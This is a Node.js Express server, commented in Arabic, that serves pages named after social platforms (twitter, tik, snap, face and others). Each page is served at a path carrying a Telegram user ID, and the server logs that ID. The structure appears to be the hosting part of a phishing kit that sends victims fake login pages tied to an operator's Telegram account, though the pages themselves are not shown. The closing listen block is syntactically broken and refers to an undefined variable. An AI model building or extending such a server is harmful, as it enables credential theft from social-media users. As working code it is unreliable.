const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// قائمة المواقع المتاحة
const availableSites = [
  'twitter.html',
  'Bobji.html',
  'tik.html',
  'snap.html',
  'face.html',
  'yot.html',
  'des.html'
  // يمكنك إضافة المزيد من المواقع هنا
];

// Middleware لتقديم الملفات الثابتة من مجلد public
app.use(express.static(path.join(__dirname, 'public')));

// Middleware للتعامل مع معرفات Telegram
app.use((req, res, next) => {
  // استخراج المسار وفحص إذا كان يحتوي على معرف Telegram
  const pathParts = req.path.split('/').filter(part => part !== '');
  
  if (pathParts.length >= 2) {
    const siteName = pathParts[0];
    const telegramId = pathParts[1];
    
    // التحقق من أن الموقع موجود
    const siteFile = `${siteName}.html`;
    if (availableSites.includes(siteFile)) {
      // إذا كان هناك معرف Telegram، نقوم بتوجيه الطلب إلى الموقع المناسب
      req.siteName = siteName;
      req.telegramId = telegramId;
      req.url = `/${siteFile}`;
    }
  }
  
  next();
});

// Route للصفحة الرئيسية
app.get('/', (req, res) => {
  res.send(`
    welcome 
  `);
});

// Route للتعامل مع المواقع بدون معرف Telegram
app.get('/:siteName', (req, res) => {
  const siteName = req.params.siteName;
  const siteFile = `${siteName}.html`;
  
  if (availableSites.includes(siteFile)) {
    res.sendFile(path.join(__dirname, 'public', siteFile));
  } else {
    res.status(404).send(`
      
    `);
  }
});

// Route للتعامل مع المواقع مع معرف Telegram
app.get('/:siteName/:telegramId', (req, res) => {
  const siteName = req.params.siteName;
  const telegramId = req.params.telegramId;
  const siteFile = `${siteName}.html`;
  
  if (availableSites.includes(siteFile)) {
    // هنا يمكنك إضافة أي معالجة إضافية متعلقة بمعرف Telegram
    console.log(`طلب موقع ${siteName} مع معرف Telegram: ${telegramId}`);
    
    // تقديم الموقع المطلوب
    res.sendFile(path.join(__dirname, 'public', siteFile));
  } else {
    res.status(404).send(`
      
    `);
  }
});

// بدء الخادم
app.listen(PORT, () => {
  console.log(`الخادم يعمل على المنفذ ${PORT}`);
    console.log(`- http://localhost:${PORT}/${siteName}`);
    console.log(`- http://localhost:${PORT}/${siteName});
  });
});
